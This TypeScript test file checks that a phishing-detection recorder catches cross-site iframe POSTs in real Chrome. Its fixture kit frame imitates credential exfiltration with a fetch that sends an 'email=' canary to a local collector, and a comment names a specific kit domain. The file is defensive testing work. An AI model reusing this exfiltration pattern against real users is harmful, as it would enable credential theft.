import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { homedir } from "node:os";
import { createServer, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import puppeteer, { type Browser } from "rebrowser-puppeteer-core";

import { ExfiltrationNetworkRecorder } from "./recorder";

/*
 * Real-Chrome checks of the recorder's CDP attachment. Two origins are cross-site
 * (127.0.0.1 and localhost), so a frame on one is out-of-process from the page on
 * the other, which is the loader-kit case (a page framing stop.relizedog.com).
 * Skipped when no Chromium binary is available; set PHISHING_TEST_CHROMIUM to run.
 */
const chromiumExecutable = process.env.PHISHING_TEST_CHROMIUM
	?? `${homedir()}/Library/Caches/ms-playwright/chromium_headless_shell-1248/chrome-headless-shell-mac-arm64/chrome-headless-shell`;
const chromiumAvailable = await Bun.file(chromiumExecutable).exists();

let collector: Server;
let pageServer: Server;
let kitServer: Server;
let collectorOrigin: string;
let pageOrigin: string;
let kitOrigin: string;
let browser: Browser | undefined;

/** The body a kit frame sends; unique per frame id so tests cannot match each other's traffic. */
function kitCanary(frame: string): string {
	return `email=cross-site-frame-canary-${frame}`;
}

/**
 * The first-run test waits up to 10 s for its canary. Bun's default per-test
 * timeout is 5 s, which the runner would hit before that wait decides, so this
 * test gets a limit that covers the wait plus the setup around it.
 */
const FIRST_RUN_TEST_TIMEOUT_MS = 15_000;

beforeAll(async () => {
	if (!chromiumAvailable) return;
	collector = createServer((request, response) => {
		response.setHeader("access-control-allow-origin", "*");
		response.setHeader("access-control-allow-headers", "*");
		response.setHeader("access-control-allow-methods", "POST,OPTIONS");
		response.end("ok");
	});
	await new Promise<void>((resolve) => collector.listen(0, "127.0.0.1", resolve));
	collectorOrigin = `http://127.0.0.1:${(collector.address() as AddressInfo).port}`;
	// The kit frame sends its canary as soon as it runs; the probe's later drive sends after attach.
	// Each frame's canary is derived from its own URL, so a match can only come from that frame.
	// Sharing one canary across tests let an earlier test's kit frame satisfy a later assertion.
	kitServer = createServer((request, response) => {
		const requested = new URL(request.url ?? "/", "http://localhost").searchParams.get("frame") ?? "default";
		// The id is placed inside a script string, so only a plain token is accepted.
		const frame = /^[a-z]+$/.test(requested) ? requested : "default";
		const canary = kitCanary(frame);
		response.setHeader("content-type", "text/html");
		response.end(`<!doctype html><html><body><script>
		window.sendCanary = () => fetch("${collectorOrigin}/collect", { method: "POST", body: "${canary}", mode: "no-cors" });
		window.sendCanary();
	</script></body></html>`);
	});
	await new Promise<void>((resolve) => kitServer.listen(0, "localhost", resolve));
	kitOrigin = `http://localhost:${(kitServer.address() as AddressInfo).port}`;
	pageServer = createServer((request, response) => {
		response.setHeader("content-type", "text/html");
		response.end(`<!doctype html><html><body><h1>loader</h1><iframe src="${kitOrigin}/kit?frame=existing" width="300" height="200"></iframe></body></html>`);
	});
	await new Promise<void>((resolve) => pageServer.listen(0, "127.0.0.1", resolve));
	pageOrigin = `http://127.0.0.1:${(pageServer.address() as AddressInfo).port}`;
	browser = await puppeteer.launch({ executablePath: chromiumExecutable, headless: true, args: ["--no-first-run", "--site-per-process"] });
});

afterAll(async () => {
	await browser?.close().catch(() => undefined);
	for (const server of [collector, pageServer, kitServer]) server?.close();
});

describe.skipIf(!chromiumAvailable)("exfiltration recorder against real Chrome", () => {
	test("captures a POST from a cross-site frame that exists before recording starts", async () => {
		const page = await browser!.newPage();
		await page.goto(`${pageOrigin}/`, { waitUntil: "networkidle0" });
		const frames = page.frames().filter((frame) => frame.url().startsWith(kitOrigin));
		expect(frames.length).toBeGreaterThan(0);
		const recorder = new ExfiltrationNetworkRecorder();
		await recorder.start(browser! as never);
		// Drive the frame after the recorder attached, as Skyvern does during a probe.
		await frames[0]!.evaluate(() => (window as unknown as { sendCanary: () => Promise<unknown> }).sendCanary());
		await new Promise((resolve) => setTimeout(resolve, 1_000));
		const captured = await recorder.stop();
		expect(captured).toEqual(expect.arrayContaining([
			expect.objectContaining({ url: `${collectorOrigin}/collect`, method: "POST", postData: kitCanary("existing") }),
		]));
		await page.close();
	});

	test("captures a POST from a frame created after recording starts when the frame later sends it", async () => {
		const page = await browser!.newPage();
		await page.goto(`${pageOrigin}/`, { waitUntil: "networkidle0" });
		const recorder = new ExfiltrationNetworkRecorder();
		await recorder.start(browser! as never);
		await page.evaluate((url) => {
			const frame = document.createElement("iframe");
			frame.src = url;
			document.body.appendChild(frame);
		}, `${kitOrigin}/kit?frame=late`);
		await new Promise((resolve) => setTimeout(resolve, 1_500));
		const kitFrame = page.frames().find((frame) => frame.url().includes("frame=late"));
		expect(kitFrame).toBeDefined();
		await kitFrame!.evaluate(() => (window as unknown as { sendCanary: () => Promise<unknown> }).sendCanary());
		await new Promise((resolve) => setTimeout(resolve, 1_000));
		const captured = await recorder.stop();
		expect(captured.some((request) => request.postData === kitCanary("late"))).toBeTrue();
		await page.close();
	});

	test("captures a synchronous first-run send from a late cross-site frame under site isolation", async () => {
		// Measured 5/5 under --site-per-process: a frame that sends while its first script runs
		// is captured. An earlier run without site isolation lost that send, so this test pins
		// the isolated configuration the probe launches Chromium with.
		const page = await browser!.newPage();
		await page.goto(`${pageOrigin}/`, { waitUntil: "networkidle0" });
		const recorder = new ExfiltrationNetworkRecorder();
		await recorder.start(browser! as never);
		await page.evaluate((url) => {
			const frame = document.createElement("iframe");
			frame.src = url;
			document.body.appendChild(frame);
		}, `${kitOrigin}/kit?frame=firstrun`);
		// Wait for the canary the frame sends, up to a bounded deadline, rather than a fixed
		// sleep: a slow frame under load then passes, and a genuinely lost send still fails.
		const expectedCanary = kitCanary("firstrun");
		const canaryCaptured = () => recorder.snapshot().some((request) => request.postData === expectedCanary && request.url.includes("/collect"));
		const deadline = Date.now() + 10_000;
		while (!canaryCaptured() && Date.now() < deadline) await new Promise((resolve) => setTimeout(resolve, 100));
		const captured = await recorder.stop();
		expect(captured.some((request) => request.postData === expectedCanary && request.url.includes("/collect"))).toBeTrue();
		await page.close();
	}, FIRST_RUN_TEST_TIMEOUT_MS);
});
